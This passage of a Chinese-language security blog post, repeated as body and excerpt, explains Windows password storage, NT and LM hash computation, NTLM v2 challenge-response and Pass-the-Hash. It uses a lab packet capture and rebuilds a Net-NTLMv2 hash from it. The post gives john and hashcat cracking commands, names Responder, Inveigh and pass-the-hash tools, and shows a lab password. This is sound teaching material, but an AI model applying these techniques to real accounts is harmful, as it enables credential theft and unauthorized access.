“KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个结果转换为16进制。</span><br><span class=\"line\">-&gt; 00110000100110001000110001101000000101000001001000001100 00000000</span><br><span class=\"line\">-&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C</span><br><span class=\"line\"></span><br><span class=\"line\">由于我们的密码不超过7字节，所以后面的一半是固定的:</span><br><span class=\"line\">AA-D3-B4-35-B5-14-04-EE</span><br><span class=\"line\"></span><br><span class=\"line\">连接两个DES加密字符串。得到LM哈希。</span><br><span class=\"line\">48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE</span><br></pre></td></tr></table></figure>\n<p>通过算法我们可以看到<code>LM Hash</code>脆弱点就在于DES的Key（<code>KGS!@#$%</code>）是固定的，也就是说，有了Key就能够解出原文。</p>\n<p>并且根据<code>LM Hash</code>特征，也能够判断用户的密码是否是大于等于7位。</p>\n<p>破解方式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john --format=lm hash.txt</span><br><span class=\"line\">hashcat -m 3000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>\n<p><strong>用Python计算Hash并与系统(win10)内存存储的Hash对比：</strong></p>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E6%88%AA%E5%9B%BE20190405092904.png\" alt></p>\n<h3 id=\"0x02-NTLM-v1-v2（AKA-Net-NTLM-v1-v2）\"><a href=\"#0x02-NTLM-v1-v2（AKA-Net-NTLM-v1-v2）\" class=\"headerlink\" title=\"0x02 NTLM v1/v2（AKA Net-NTLM v1/v2）\"></a>0x02 NTLM v1/v2（AKA Net-NTLM v1/v2）</h3><blockquote>\n<p><code>NTLM（NT LAN Manager）</code>，又称为<code>Net-NTLM</code>，是一个网络认证协议，他是一种用于在Client和Server之间进行Challenge/Response验证的协议。</p>\n</blockquote>\n<p><strong>NTLM v1/v2与LM、NT Hash的关系：</strong></p>\n<p>NTLM是一个认证协议，使用LM Hash或NT Hash来进行验证。</p>\n<blockquote>\n<ul>\n<li>在NTLM v1中，使用LM Hash和NT Hash来进行验证，如今v1已被废弃。</li>\n<li>自从Windows 2000之后，NTLM v2是默认的认证协议。</li>\n</ul>\n</blockquote>\n<p>NTLM v1与NTLM v2之间的区别我们放在网络认证的章节来讨论。</p>\n<h3 id=\"0x03-本地认证\"><a href=\"#0x03-本地认证\" class=\"headerlink\" title=\"0x03 本地认证\"></a>0x03 本地认证</h3><blockquote>\n<p>所谓的本地认证即在物理主机上直接进行登录的认证过程。</p>\n</blockquote>\n<p><strong>本地认证的大致流程：</strong></p>\n<blockquote>\n<p>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</p>\n</blockquote>\n<ul>\n<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li>\n<li>LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</li>\n</ul>\n<p><strong>具体流程：</strong></p>\n<p>1.当我们刚开机、注销等操作后，<code>winlogon.exe</code>进程会显示一个登录界面要求我们输入用户名和密码。</p>\n<p>2.我们输入用户名和密码后，会被<code>winlogon.exe</code>获取，然后将其发送给<code>lsass.exe</code>进程。</p>\n<p>3.<code>lsass.exe</code>将明文密码计算得到<code>NT Hash</code>（不考虑LM）。</p>\n<p>4.之后会将用户名和计算得到的<code>NT Hash</code>拿到<code>SAM</code>数据库去查找比对。</p>\n<h3 id=\"0x04-网络认证\"><a href=\"#0x04-网络认证\" class=\"headerlink\" title=\"0x04 网络认证\"></a>0x04 网络认证</h3><blockquote>\n<p>网络认证，顾名思义即通过网络进行认证，常见于工作组环境中，例如访问共享时进行的认证就是网络认证。网络认证使用的协议为NTLM协议。</p>\n</blockquote>\n<p><strong>NTLM v2认证流程：</strong></p>\n<p>认证流程大致可以分为三步：</p>\n<blockquote>\n<ul>\n<li>协商：主要用于确认双方协议版本。</li>\n<li>质询：进行挑战（Chalenge）/响应（Response）认证机制的阶段，是最重要的阶段，也是我们主要讨论的环节。</li>\n<li>验证：质询完成后，验证结果。</li>\n</ul>\n</blockquote>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E6%88%AA%E5%9B%BE20190404133112.png\" alt></p>\n<p>质询的完整过程：</p>\n<p>客户端向服务器端发送包含用户信息(用户名)的请求。</p>\n<p>服务器接受到请求后，先使用接收到用户名到<code>SAM</code>数据库中查找看是否存在，若存在则提取对应的<code>NT Hash</code>。</p>\n<p>然后服务器会生成一个16位的随机数，称之为“Challenge”，并使用提取的<code>NT Hash</code>加密<code>Challenge</code>(16位随机字符)，得到加密结果记作<code>Challenge2</code>存储在内存中。同时，将Challenge(16位随机字符)发送给客户端。</p>\n<p>客户端接受到<code>Challenge</code>后，使用将要登录的账户对应的<code>NT Hash</code>加密(HAMC-MD5算法)<code>Challenge</code>生成<code>Response</code>(将明文密码计算为<code>NT Hash</code>是客户端计算机接收到用户输入的密码后自动做的事情)，然后将<code>Response</code>发送至服务器端。</p>\n<p>验证： 服务器端收到客户端的<code>Response</code>后，比对<code>Chanllenge2</code>与<code>Response</code>是否相等，若相等，则认证通过。</p>\n<p><strong>抓包分析认证过程：</strong></p>\n<p>实验环境介绍：</p>\n<blockquote>\n<p>w2k8 r2建立一个文件共享，Win 10客户端访问文件共享，访问共享时需要进行登录认证，在Win 10客户机使用Wireshark进行抓包。</p>\n</blockquote>\n<ul>\n<li>w2k8 r2：192.168.1.102</li>\n<li>Win 10：192.168.1.101</li>\n<li>用户名：administrator</li>\n<li>密码：@superwu123</li>\n</ul>\n<p>抓包分析：</p>\n<p>先来看一下抓到的包总体情况,如下图。</p>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406111646.png\" alt></p>\n<p>接下来我们直接看NTLM认证过程的第二个数据包，可以看到服务器返回了Challenge，记作<code>NTLM Server Challenge</code>，值为：<code>79f3c64adead4f15</code>。</p>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406112000.png\" alt></p>\n<p><strong>Net-NTLM Hash</strong></p>\n<p>这里插入一段介绍Net-NTLM Hash。</p>\n<blockquote>\n<p>Net-NTLM Hash用于Net-NTLM协议进行网络身份验证（它们来自质询/响应算法，并基于用户的<code>NT Hash</code>）。</p>\n<p>Net-NTLM Hash我认为并不是具体的一种Hash值，而是一种格式，从NTLM认证过程数据包中提取一些信息拼凑起来得到的格式。</p>\n<p>根据协议版本的不同，Net-NTLM Hash又分为<code>Net-NTLMv1 Hash</code>和<code>Net-NTLMv2 Hash</code>。</p>\n</blockquote>\n<p><code>Net-NTLMv2 Hash</code>格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username::hostname:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>\n<p>username即用户名。</p>\n<p>hostname即服务器IP（或主机名）。</p>\n<p>challenge是Server Challenge，即服务器返回的随机数。</p>\n<p>HMAC-MD5对应数据包中的<code>NTProofStr</code>字段。</p>\n<p>blob对应数据包中<code>NTLMv2 Response</code>的<code>NTProofStr</code>之后的部分。</p>\n<p>紧接着我们看下一个数据包（Response），可以先看到有一个<code>NTLM v2 Response</code>，然后<code>NTLMv2 Client Challenge</code>就是客户端加密<code>Server Challenge</code>得到的。</p>\n<blockquote>\n<ul>\n<li>NTLM v2 Response值为：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 09 68 4a af 9d 32 8a 4c c2 3c 30 1d 70 61 23 2d</span><br><span class=\"line\">&gt; 01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01</span><br><span class=\"line\">&gt; ae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 00</span><br><span class=\"line\">&gt; 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00</span><br><span class=\"line\">&gt; 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00</span><br><span class=\"line\">&gt; 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00</span><br><span class=\"line\">&gt; 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00</span><br><span class=\"line\">&gt; 04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00</span><br><span class=\"line\">&gt; 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00</span><br><span class=\"line\">&gt; 31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00</span><br><span class=\"line\">&gt; 52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00</span><br><span class=\"line\">&gt; 52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01</span><br><span class=\"line\">&gt; 06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00</span><br><span class=\"line\">&gt; 00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00</span><br><span class=\"line\">&gt; 1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3</span><br><span class=\"line\">&gt; 3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00</span><br><span class=\"line\">&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class=\"line\">&gt; 09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00</span><br><span class=\"line\">&gt; 39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00</span><br><span class=\"line\">&gt; 2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00</span><br><span class=\"line\">&gt; 00 00 00 00</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<ul>\n<li>NTLMv2 Client Challenge值为：<code>aed4bf395149f64e</code></li>\n</ul>\n</blockquote>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E5%9B%BE%E7%89%8720190406112206.png\" alt></p>\n<p>我们可以从数据包中提取并构建出<code>Net-NTLM Hash</code>：</p>\n<p>username即<code>administrator</code>。</p>\n<p>hostname即<code>192.168.1.102</code>。</p>\n<p>challenge即<code>79f3c64adead4f15</code>。（这里要注意的是是Server Challenge，而不是Client Challenge）</p>\n<p>HMAC-MD5即<code>09684aaf9d328a4cc23c301d7061232d</code>。</p>\n<p>blob即：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01</span><br><span class=\"line\">ae d4 bf 39 51 49 f6 4e 00 00 00 00 02 00 1e 00</span><br><span class=\"line\">57 00 49 00 4e 00 2d 00 55 00 52 00 41 00 55 00</span><br><span class=\"line\">30 00 4c 00 4a 00 42 00 37 00 52 00 31 00 01 00</span><br><span class=\"line\">1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00 41 00</span><br><span class=\"line\">55 00 30 00 4c 00 4a 00 42 00 37 00 52 00 31 00</span><br><span class=\"line\">04 00 1e 00 57 00 49 00 4e 00 2d 00 55 00 52 00</span><br><span class=\"line\">41 00 55 00 30 00 4c 00 4a 00 42 00 37 00 52 00</span><br><span class=\"line\">31 00 03 00 1e 00 57 00 49 00 4e 00 2d 00 55 00</span><br><span class=\"line\">52 00 41 00 55 00 30 00 4c 00 4a 00 42 00 37 00</span><br><span class=\"line\">52 00 31 00 07 00 08 00 32 3b 26 fa 22 ec d4 01</span><br><span class=\"line\">06 00 04 00 02 00 00 00 08 00 30 00 30 00 00 00</span><br><span class=\"line\">00 00 00 00 01 00 00 00 00 20 00 00 83 61 12 00</span><br><span class=\"line\">1b 95 5a d5 09 15 f1 c9 06 70 51 a1 67 f3 56 d3</span><br><span class=\"line\">3e 2b ab 5f b2 63 49 b2 ca 9f 05 49 0a 00 10 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class=\"line\">09 00 24 00 63 00 69 00 66 00 73 00 2f 00 31 00</span><br><span class=\"line\">39 00 32 00 2e 00 31 00 36 00 38 00 2e 00 31 00</span><br><span class=\"line\">2e 00 31 00 30 00 32 00 00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00</span><br></pre></td></tr></table></figure>\n<p>最终结果为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">administrator::192.168.1.102:79f3c64adead4f15:09684aaf9d328a4cc23c301d7061232d:0101000000000000323b26fa22ecd401aed4bf395149f64e0000000002001e00570049004e002d00550052004100550030004c004a00420037005200310001001e00570049004e002d00550052004100550030004c004a00420037005200310004001e00570049004e002d00550052004100550030004c004a00420037005200310003001e00570049004e002d00550052004100550030004c004a00420037005200310007000800323b26fa22ecd40106000400020000000800300030000000000000000100000000200000836112001b955ad50915f1c9067051a167f356d33e2bab5fb26349b2ca9f05490a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003200000000000000000000000000</span><br></pre></td></tr></table></figure>\n<p><strong>使用中间人攻击的方式可以获取Net-NTLM hash，常用工具为Responder和Inveigh。</strong></p>\n<p><strong>NTLM v1/v2区别：</strong></p>\n<p>认证的流程是一样的，不同的地方在于：</p>\n<blockquote>\n<ul>\n<li>Challage长度：NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。</li>\n<li>加密Challenge的算法：NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</li>\n</ul>\n</blockquote>\n<h3 id=\"0x05-Pass-The-Hash\"><a href=\"#0x05-Pass-The-Hash\" class=\"headerlink\" title=\"0x05 Pass The Hash\"></a>0x05 Pass The Hash</h3><p>观察NTLM认证的过程可以发现，整个过程中实际上并没有进行明文密码的传递，也没有使用明文密码来加密Challenge，而是用明文密码对应<code>NT Hash</code>来加密<code>Challenge</code>，那么就意味着：</p>\n<blockquote>\n<p>只要我们知道相应用户密码的<code>NT Hash</code>，我们就可以自己构造出<code>Response</code>发送给服务器，从而通过验证。我们并不需要知道用户的明文密码。这种攻击方式就称之为哈希传递（Pass The Hash）。</p>\n</blockquote>\n<p>常用哈希传递攻击的工具：</p>\n<ul>\n<li>Smbmap</li>\n<li>Smbexec</li>\n<li>Metasploit psexec</li>\n<li>CrackMapExec</li>\n</ul>\n<p><strong>参考资料</strong></p>\n<p><a href=\"https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4\" target=\"_blank\" rel=\"noopener\">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</a></p>\n<p><a href=\"https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\" target=\"_blank\" rel=\"noopener\">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</a></p>\n<p><a href=\"http://www.adshotgyan.com/2012/02/lm-hash-and-nt-hash.html\" target=\"_blank\" rel=\"noopener\">http://www.adshotgyan.com/2012/02/lm-hash-and-nt-hash.html</a></p>\n<p><a href=\"https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#0x00-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81\" target=\"_blank\" rel=\"noopener\">https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#0x00-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81</a></p>\n<p><a href=\"https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/\" target=\"_blank\" rel=\"noopener\">https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/2205\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2205</a></p>\n<p><a href=\"https://github.com/crazywa1ker/DarthSidious-Chinese/blob/master/getting-started/intro-to-windows-hashes.md\" target=\"_blank\" rel=\"noopener\">https://github.com/crazywa1ker/DarthSidious-Chinese/blob/master/getting-started/intro-to-windows-hashes.md</a></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-Windows密码存储\"><a href=\"#0x00-Windows密码存储\" class=\"headerlink\" title=\"0x00 Windows密码存储\"></a>0x00 Windows密码存储</h3><p>We all konw，明文存储密码是很愚蠢的行为，因为如果系统被攻破，明文密码被拿到，那么意味就全完了，但是如果是先加密再进行存储的话，即使黑客拿到加密的密码，破解也是需要费很大功夫和时间的。</p>\n<p>而现在采用的加密算法基本都是Hash摘要算法，Hash算法可以把任意长度的输入通过散列算法输出一串固定长度的值。</p>\n<p>常见的Hash算法诸如md5、SHA等，Hash算法有如下特点：</p>\n<blockquote>\n<ul>\n<li>单向不可逆性：通过Hash值无法反向推导出输入的值。</li>\n<li>如果两个哈希值相同，两个输入值很可能(极大概率)是相同的，但也可能不同，这种情况称为“哈希碰撞”</li>\n</ul>\n</blockquote>\n<p>说了那么多就是为了表明一点，Windows在存储用户密码时也不直接存储明文密码，存储的是明文密码经过Hash计算得到的Hash值，Windows存储的Hash称为<code>NTLM Hash</code>，或者<code>NTLM</code>。</p>","more":"<p><strong>存储路径：</strong></p>\n<p>首先用户密码的Hash肯定需要存储在系统的某个文件或数据库中，Windows将用户密码计算得到的Hash存储在：</p>\n<blockquote>\n<ul>\n<li>工作组或本地环境中，存储在一个名为<code>SAM</code>的文件内，文件路径为：<code>%SystemRoot%\\system32\\config\\sam</code></li>\n<li>如果是域环境，它们还存储在NTDS.dit数据库中。</li>\n</ul>\n</blockquote>\n<p><strong>存储格式：</strong></p>\n<p>Windows会存储用户密码对应的两种Hash，分别是<code>LM Hash</code>和<code>NT Hash</code>，它们是如何计算的，我们下节讨论。但要注意的一点是，从Windows Vista 和 Windows Server 2008开始，默认情况下只存储<code>NT Hash</code>，<code>LM Hash</code>将不再存储。</p>\n<p>格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username : unique_identifier : LM hash : NT hash</span><br></pre></td></tr></table></figure>\n<p>username即用户名。</p>\n<p>unique_identifier即盐（salt）。</p>\n<p>Windows将用户的密码计算为<code>LM Hash</code>和<code>NT Hash</code>，然后将它们使用冒号<code>:</code>分割存储在数据库中。</p>\n<h3 id=\"0x01-NT-Hash与LM-Hash\"><a href=\"#0x01-NT-Hash与LM-Hash\" class=\"headerlink\" title=\"0x01 NT Hash与LM Hash\"></a>0x01 NT Hash与LM Hash</h3><p><code>LM Hash</code>是早期Windows存储的Hash格式，从Windows Vista/Server 2008开始默认是关闭的。</p>\n<p><code>NT Hash</code>是现在Windows主要的存储的Hash。</p>\n<p><strong>NT Hash算法：</strong></p>\n<p>1.先将用户密码转换为十六进制格式。</p>\n<p>2.将十六进制格式的密码进行Unicode编码。</p>\n<p>3.使用MD4摘要算法对Unicode编码数据进行Hash计算，得到结果就是<code>NT Hash</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin -&gt; hex(16进制编码) = 61646d696e</span><br><span class=\"line\">61646d696e -&gt; Unicode = 610064006d0069006e00</span><br><span class=\"line\">610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure>\n<p>破解方式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john --format=nt hash.txt</span><br><span class=\"line\">hashcat -m 1000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>\n<p><strong>LM Hash算法：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将所有小写字母转换为大写字母</span><br><span class=\"line\">&gt;123ABC    // 未达到7个字符</span><br><span class=\"line\"></span><br><span class=\"line\">将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补</span><br><span class=\"line\">&gt;31323341424300000000000000</span><br><span class=\"line\"></span><br><span class=\"line\">将密码分割为两组7个字符</span><br><span class=\"line\">&gt;31323341424300 00000000000000   //16进制</span><br><span class=\"line\"></span><br><span class=\"line\">将每组转化为比特流，不足56Bit则在左边加0</span><br><span class=\"line\">&gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补足56Bit) 00110001001100100011001101000001010000100100001100000000</span><br><span class=\"line\"></span><br><span class=\"line\">将比特流按照7比特一组，分出8组，末尾加0</span><br><span class=\"line\">由于后者都为0，结果可想而知，那就都是0;</span><br><span class=\"line\">将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个结果转换为16进制。</span><br><span class=\"line\">-&gt; 00110000100110001000110001101000000101000001001000001100 00000000</span><br><span class=\"line\">-&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C</span><br><span class=\"line\"></span><br><span class=\"line\">由于我们的密码不超过7字节，所以后面的一半是固定的:</span><br><span class=\"line\">AA-D3-B4-35-B5-14-04-EE</span><br><span class=\"line\"></span><br><span class=\"line\">连接两个DES加密字符串。得到LM哈希。</span><br><span class=\"line\">48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE</span><br></pre></td></tr></table></figure>\n<p>通过算法我们可以看到<code>LM Hash</code>脆弱点就在于DES的Key（<code>KGS!@#$%</code>）是固定的，也就是说，有了Key就能够解出原文。</p>\n<p>并且根据<code>LM Hash</code>特征，也能够判断用户的密码是否是大于等于7位。</p>\n<p>破解方式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john --format=lm hash.txt</span><br><span class=\"line\">hashcat -m 3000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>\n<p><strong>用Python计算Hash并与系统(win10)内存存储的Hash对比：</strong></p>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E6%88%AA%E5%9B%BE20190405092904.png\" alt></p>\n<h3 id=\"0x02-NTLM-v1-v2（AKA-Net-NTLM-v1-v2）\"><a href=\"#0x02-NTLM-v1-v2（AKA-Net-NTLM-v1-v2）\" class=\"headerlink\" title=\"0x02 NTLM v1/v2（AKA Net-NTLM v1/v2）\"></a>0x02 NTLM v1/v2（AKA Net-NTLM v1/v2）</h3><blockquote>\n<p><code>NTLM（NT LAN Manager）</code>，又称为<code>Net-NTLM</code>，是一个网络认证协议，他是一种用于在Client和Server之间进行Challenge/Response验证的协议。</p>\n</blockquote>\n<p><strong>NTLM v1/v2与LM、NT Hash的关系：</strong></p>\n<p>NTLM是一个认证协议，使用LM Hash或NT Hash来进行验证。</p>\n<blockquote>\n<ul>\n<li>在NTLM v1中，使用LM Hash和NT Hash来进行验证，如今v1已被废弃。</li>\n<li>自从Windows 2000之后，NTLM v2是默认的认证协议。</li>\n</ul>\n</blockquote>\n<p>NTLM v1与NTLM v2之间的区别我们放在网络认证的章节来讨论。</p>\n<h3 id=\"0x03-本地认证\"><a href=\"#0x03-本地认证\" class=\"headerlink\" title=\"0x03 本地认证\"></a>0x03 本地认证</h3><blockquote>\n<p>所谓的本地认证即在物理主机上直接进行登录的认证过程。</p>\n</blockquote>\n<p><strong>本地认证的大致流程：</strong></p>\n<blockquote>\n<p>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</p>\n</blockquote>\n<ul>\n<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li>\n<li>LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</li>\n</ul>\n<p><strong>具体流程：</strong></p>\n<p>1.当我们刚开机、注销等操作后，<code>winlogon.exe</code>进程会显示一个登录界面要求我们输入用户名和密码。</p>\n<p>2.我们输入用户名和密码后，会被<code>winlogon.exe</code>获取，然后将其发送给<code>lsass.exe</code>进程。</p>\n<p>3.<code>lsass.exe</code>将明文密码计算得到<code>NT Hash</code>（不考虑LM）。</p>\n<p>4.之后会将用户名和计算得到的<code>NT Hash</code>拿到<code>SAM</code>数据库去查找比对。</p>\n<h3 id=\"0x04-网络认证\"><a href=\"#0x04-网络认证\" class=\"headerlink\" title=\"0x04 网络认证\"></a>0x04 网络认证</h3><blockquote>\n<p>网络认证，顾名思义即通过网络进行认证，常见于工作组环境中，例如访问共享时进行的认证就是网络认证。网络认证使用的协议为NTLM协议。</p>\n</blockquote>\n<p><strong>NTLM v2认证流程：</strong></p>\n<p>认证流程大致可以分为三步：</p>\n<blockquote>\n<ul>\n<li>协商：主要用于确认双方协议版本。</li>\n<li>质询：进行挑战（Chalenge）/响应（Response）认证机制的阶段，是最重要的阶段，也是我们主要讨论的环节。</li>\n<li>验证：质询完成后，验证结果。</li>\n</ul>\n</blockquote>\n<p><img src=\"/2019/04/03/01-Windows认证之NTLM/V:/hexo/myblog/source/_posts/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/QQ%E6%88%AA%E5%9B%BE20190404133112.png\" alt></p>\n<p>质询的完整过程：</p>\n<p>客户端向服务器端发送包含用户信息(用户名)的请求。</p>\n<p>服务器接受到请求后，先使用接收到用户名到<code>SAM</code>数据库中查找看是否存在，若存在则提取对应的<code>NT Hash</code>。</p>\n<p>然后服务器会生成一个16位的随机数，称之为“Challenge”，并使用提取的<code>NT Hash</code>加密<code>Challenge</code>(16位随机字符)，得到加密结果记作<code>Challenge2</code>存储在内存中。同时，将Challenge(16位随机字符)发送给客户端。</p>\n<p>客户端接受到<code>Challenge</code>后，使用将要登录的账户对应的<code>NT Hash</code>加密(HAMC-MD5算法)<code>Challenge</code>生成<code>Response</code>(将明文密码计算为<code>NT Hash</code>是客户端计算机接收到用户输入的密码后自动做的事情)，然后将<code>Response</code>发送至服务器端。</p>\n<p>验证： 服务器端收到客户端的<code>Response</code>后，比对<code>Chanllenge2</code>与<code>Response</code>是否相等，若相等，则认证通过。</p>\n<p><strong>抓包分析认证过程：</strong></p>\n<p>实验环境介绍：</p>\n<blockquote>\n<p>w2k8 r2建立一个文件共享，Win 10客户端访问文件共享，访问共享时需要进行登录认证，在Win 10客户机使用Wireshark进行抓包。</p>\n</blockquote>\n<ul>\n<li>w2k8 r2：192.168.1.102</li>\n<li>Win 